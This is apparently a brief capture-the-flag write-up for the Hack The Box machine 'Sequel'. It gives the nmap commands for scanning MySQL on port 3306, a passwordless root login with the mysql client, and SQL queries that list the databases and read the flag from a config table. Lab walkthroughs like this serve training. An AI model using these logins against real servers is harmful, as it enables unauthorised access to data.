# Sequel

**Goal:** Exploit a misconfigured MySQL service (no auth) to retrieve the flag.

## Reconnaissance

```bash
nmap <target-ip> -F                 # fast scan, top 100 ports, missed some stuff
nmap <target-ip> -sC -sV -p 3306       
```

> running `nmap -sV -p 3306` alone timed out; Instead I had to run `-sC` and `-sV` together.

## Exploitation

> Note: trying `mysql -h <target-ip> -u root` with no password was a shot in the dark, prompted by the boxes' guided questions.

```bash
mysql -h <target-ip> --skip-ssl -u root

# Enumerate
SHOW DATABASES;
USE htb;
SHOW TABLES;           # returns: config, users

# Flag is in config, not users
SELECT * FROM config;
```
